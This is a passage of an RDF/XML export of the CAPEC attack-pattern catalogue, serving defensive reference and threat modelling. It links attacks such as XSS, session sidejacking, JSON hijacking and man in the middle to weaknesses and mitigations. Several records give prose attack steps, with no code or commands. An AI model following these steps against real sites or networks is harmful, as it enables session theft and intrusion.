      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The protocol or implementations thereof must contain bugs that an adversary can exploit.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::In some variants of this attack the adversary must be able to intercept communications using the protocol. This means they need to be able to receive the communications from one participant and prevent the other participant from receiving these communications.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Use browser technologies that do not allow client side scripting.::Design: Utilize strict type  character  and encoding enforcement::Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.::Implementation: Perform input validation for all remote content.::Implementation: Perform output validation for all remote content.::Implementation: Disable scripting languages such as JavaScript in browser::Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser  web servers  and plug in technologies  staying current on patch release that deal with XSS countermeasures mitigates this.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack478">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#85">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:541::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#AJAX Fingerprinting"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::79::113::348::96::20::116::184::86::712::692::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker65">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#413"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack65"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Use browser technologies that do not allow client side scripting.::Design: Utilize strict type  character  and encoding enforcement::Design: Server side developers should not proxy content via XHR or other means  if a http proxy for remote content is setup on the server side  the client&apos;s browser has no way of discerning where the data is originating from.::Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.::Implementation: Perform input validation for all remote content  including remote and user-generated content::Implementation: Perform output validation for all remote content.::Implementation: Disable scripting languages such as JavaScript in browser::Implementation: Session tokens for specific host::Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser  web servers  and plug in technologies  staying current on patch release that deal with XSS countermeasures mitigates this.::Implementation: Privileges are constrained  if a script is loaded  ensure system runs in chroot jail or other limited authority mode::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack54">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#32">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:588::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#XSS Through HTTP Query Strings"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::80::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Spider) Using a browser or an automated tool  an attacker follows all public links on a web site. He records all the links he finds.TECHNIQUE:Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browser&apos;s plugins are available to facilitate the analysis or automate the URL discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:(Attempt variations on input parameters) Possibly using an automated tool  an attacker requests variations on the URLs he spidered before. He sends parameters that include variations of payloads. He records all the responses from the server that include unmodified versions of his script.TECHNIQUE:Use a list of XSS probe strings to inject in parameters of known URLs. If possible  the probe strings contain a unique identifier.:TECHNIQUE:Use a proxy tool to record results of manual input of XSS probes in known URLs.::STEP:3:PHASE:Exploit:DESCRIPTION:(Steal session IDs  credentials  page content  etc.) As the attacker succeeds in exploiting the vulnerability  he can choose to steal user&apos;s credentials in order to reuse or to analyze them later on.TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim&apos;s browser and sends document information to the attacker.:TECHNIQUE:Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker&apos;s server and then causes the browser to execute appropriately.::STEP:4:PHASE:Exploit:DESCRIPTION:(Forceful browsing) When the attacker targets the current application or another one (through CSRF vulnerabilities)  the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws  but it can also be used to create a widespread attack against a particular website on the user&apos;s current network (Internet or not).TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim&apos;s browser and performs actions on the same web site:TECHNIQUE:Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker&apos;s server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).::STEP:5:PHASE:Exploit:DESCRIPTION:(Content spoofing) By manipulating the content  the attacker targets the information that the user would like to get from the website.TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim&apos;s browser and exposes attacker-modified invalid information to the user on the current web page.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker174">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#138"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack174"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target application must utilize reflection libraries and allow users to directly control the parameters to these methods. If the adversary can host classes where the target can invoke them  more powerful variants of this attack are possible.::The target application must accept a string as user input  fail to sanitize characters that have a special meaning in the parameter encoding  and insert the user-supplied string in an encoding which is then processed.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Use libraries and templates that minimize unfiltered input.::Implementation: Normalize  filter and white list all input including that which is not expected to have any scripting content.::Implementation: The victim should configure the browser to minimize active content from untrusted sources.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack112">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#243">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:592::NATURE:ChildOf:CAPEC ID:588::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#XSS Targeting HTML Attributes"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::83::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker416">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#279"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack416"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::707::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An application uses SOAP-based web service api.::An application does not perform sufficient input validation to ensure that user-controllable data is safe for an XML parser.::The targeted server either fails to verify that data in SOAP messages conforms to the appropriate XML schema  or it fails to correctly handle the complete range of data allowed by the schema.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker415">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#614">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:186::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Rooting SIM Cards"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack415">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#614"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::327::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:IntegrityTECHNICAL IMPACT:Execute Unauthorized Commands::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::327::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::A SIM card that relies on the DES cipher.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:This is a sophisticated attack  but detailed techniques are published in open literature.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker79">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#578">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:176::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus>
          <j.0:Status rdf:about="http://krstProj.com/capec#Usable"/>
        </j.0:hasStatus>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Disable Security Software"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack79">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#578"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::284::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Hide Activities:NOTE:Availability Hide Activities By disabling certain security tools  the adversary can hide malicious activity and avoid detection.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::284::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary must have the capability to interact with the configuration of the targeted system.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker414">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#102">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:593::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Session Sidejacking"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack414">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#102"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::294::522::523::319::614::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Detect Unprotected Session Token Transfer) The attacker sniffs on the wireless network to detect unencrypted traffic that contains session tokens.TECHNIQUE:The attacker uses a network sniffer tool like ferret or hamster to monitor the wireless traffic at a WiFi hotspot while examining it for evidence of transmittal of session tokens in unencrypted or recognizably encrypted form. An attacker applies his knowledge of the manner by which session tokens are generated and transmitted by various target systems to identify the session tokens.::STEP:2:PHASE:Experiment:DESCRIPTION:(Capture session token) The attacker uses sniffing tools to capture a session token from traffic.::STEP:3:PHASE:Experiment:DESCRIPTION:(Insert captured session token) The attacker attempts to insert a captured session token into communication with the targeted application to confirm viability for exploitation.::STEP:4:PHASE:Exploit:DESCRIPTION:(Session Token Exploitation) The attacker leverages the captured session token to interact with the targeted application in a malicious fashion  impersonating the victim.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::294::522::523::319::614::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::An attacker and the victim are both using the same WiFi network.::The victim has an active session with a target system.::The victim is not using a secure channel to communicate with the target system (e.g. SSL  VPN  etc.)::The victim initiated communication with a target system that requires transfer of the session token or the target application uses AJAX and thereby periodically rings home asynchronously using the session token::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Easy to use tools exist to automate this attack.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::A packet sniffing tool  such as wireshark  can be used to capture session information.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::To mitigate this type of an attack  an organization can enable ingress filtering. Additionally modifications to BGP like black hole routing and sinkhole routing(RFC3882) help mitigate the spoofed source IP nature of these attacks.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack137">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#487">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:125::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#ICMP Flood"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::770::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Ensure that server side code can differentiate between legitimate requests and forged requests. The solution is similar to protection against Cross Site Request Forger (CSRF)  which is to use a hard to guess random nonce (that is unique to the victim&apos;s session with the server) that the attacker has no way of knowing (at least in the absence of other weaknesses). Each request from the client to the server should contain this nonce and the server should reject all requests that do not contain the nonce.::On the client side  the system&apos;s design could make it difficult to get access to the JSON object content via the script tag. Since the JSON object is never assigned locally to a variable  it cannot be readily modified by the attacker before being used by a script tag. For instance  if while(1) was added to the beginning of the JavaScript returned by the server  trying to access it with a script tag would result in an infinite loop. On the other hand  legitimate client side code can remove the while(1) statement after which the JavaScript can be evaluated. A similar result can be achieved by surrounding the returned JavaScript with comment tags  or using other similar techniques (e.g. wrapping the JavaScript with HTML tags).::Make the URLs in the system used to retrieve JSON objects unpredictable and unique for each user session.::Ensure that to the extent possible  no sensitive data is passed from the server to the client via JSON objects. JavaScript was never intended to play that role  hence the same origin policy does not adequate address this scenario.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack334">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#111">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:212::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#JSON Hijacking (aka JavaScript Hijacking)"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::345::346::352::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Understand How to Request JSON Responses from the Target System) An attacker first explores the target system to understand what URLs need to be provided to it in order to retrieve JSON objects that contain information of interest to the attacker.TECHNIQUE:An attacker creates an account with the target system and observes requests and the corresponding JSON responses from the server. Understanding how to properly elicit responses from the server is crucial to the attackers&apos; ability to craft the exploit.::STEP:2:PHASE:Experiment:DESCRIPTION:(Craft a malicious website)The attacker crafts a malicious website to which he plans to lure the victim who is using the vulnerable target system. The malicious website does two things: 1. Contains a hook that intercepts incoming JSON objects  reads their contents and forwards the contents to the server controlled by the attacker (via a new XMLHttpRequest). 2. Uses the script tag with a URL in the source that requests a JSON object from the vulnerable target system. Once the JSON object is transmitted to the victim&apos;s browser  the malicious code (as described in step 1) intercepts that JSON object  steals its contents  and forwards to the attacker. This attack step leverages the fact that the same origin policy in the browser does not protect JavaScript originating from one domain from setting up an environment to intercept and access JSON objects arriving from a completely different domain.::STEP:3:PHASE:Exploit:DESCRIPTION:(Launch JSON hijack) An attacker lures the victim to the malicious website or leverages other means to get his malicious code executing in the victim&apos;s browser. Once that happens  the malicious code makes a request to the victim target system to retrieve a JSON object with sensitive information. The request includes the victim&apos;s session cookie if the victim is logged in.TECHNIQUE:An attacker employs a myriad of standard techniques to get the victim to visit his or her malicious site or by some other means get the attackers&apos; malicious code executing in the victim&apos;s browser.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker413">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#572"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack413"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker192">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#293"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack192"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::A network capable of routing the attackers&apos; packets to the destination network.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::A command line version of traceroute or similar tool that performs route enumeration.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker191">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#330"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack191"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The ability to monitor and interact with network communications.Access to at least one host  and the privileges to interface with the network interface card.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3  Port Unreachable..::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Identify programs that may be used to acquire process information and block them by using a software restriction policy or tools that restrict program execution by process whitelisting.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack94">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#573">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:169::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Process Footprinting"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
      </j.0:Attack>
    </j.0:reduces>
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack25">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#270">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:203::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Modification of Registry Run Keys"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::15::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data:TECHNICAL IMPACT:Gain Privileges::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Get your Public Key signed by a Certificate Authority::Encrypt your communication using cryptography (SSL ...)::Use Strong mutual authentication to always fully authenticate both ends of any communications channel.::Exchange public keys using a secure channel::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack505">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#94">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:CanFollow:CAPEC ID:185::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Man in the Middle Attack"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::300::290::593::287::294::724::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Experiment:DESCRIPTION:The attacker probes to determine the nature and mechanism of communication between two components looking for opportunities to exploit.::STEP:2:PHASE:Experiment:DESCRIPTION:The attacker inserts himself into the communication channel initially acting as a routing proxy between the two targeted components. The attacker may or may not have to use cryptography.::STEP:3:PHASE:Exploit:DESCRIPTION:The attacker observes  filters or alters passed data of its choosing to gain access to sensitive information or to manipulate the actions of the two target components for his own purposes.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker419">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#3">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:267::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Using Leading &apos;Ghost&apos; Character Sequences to Bypass Input Filters"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack419">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#3"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::173::41::172::171::179::180::181::183::184::20::74::697::707::"/>
        </j.0:exploits>
        <j.0:executes>
